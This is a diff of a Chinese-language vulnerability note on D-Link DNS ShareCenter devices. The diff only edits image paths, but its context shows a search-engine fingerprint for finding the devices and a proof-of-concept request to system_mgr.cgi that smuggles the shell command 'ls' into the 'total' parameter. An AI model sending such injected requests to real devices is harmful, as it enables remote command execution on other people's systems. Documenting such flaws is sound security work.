@@ -20,7 +20,7 @@ app="D_Link-DNS-ShareCenter"
 
 登录页面如下
 
-![](./images/202202162224540.png)
+![](images/202202162224540.png)
 
 漏洞POC为
 
@@ -28,4 +28,4 @@ app="D_Link-DNS-ShareCenter"
 /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
 ```
 
-![](./images/202202162224614.png)
+![](images/202202162224614.png)
